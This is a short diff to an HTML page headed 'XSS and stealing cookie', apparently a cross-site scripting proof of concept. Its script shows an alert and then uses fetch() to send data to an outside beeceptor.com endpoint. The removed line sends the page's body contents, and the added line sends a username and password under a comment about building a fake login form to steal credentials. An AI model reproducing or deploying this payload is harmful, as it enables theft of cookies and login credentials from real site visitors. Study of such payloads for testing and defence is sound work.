@@ -4,7 +4,8 @@
 	<h2> XSS and stealing cookie </h2>
 	<script>
 		alert('XSS via print.html');
-		fetch('https://splitting.free.beeceptor.com?cookie=' + encodeURIComponent(document.body.innerHTML));
+		// We can create fake login form to steal the user credentials
+		fetch('https://splitting.free.beeceptor.com?username=test&password=test');
 	</script>
 </body>
 </html>
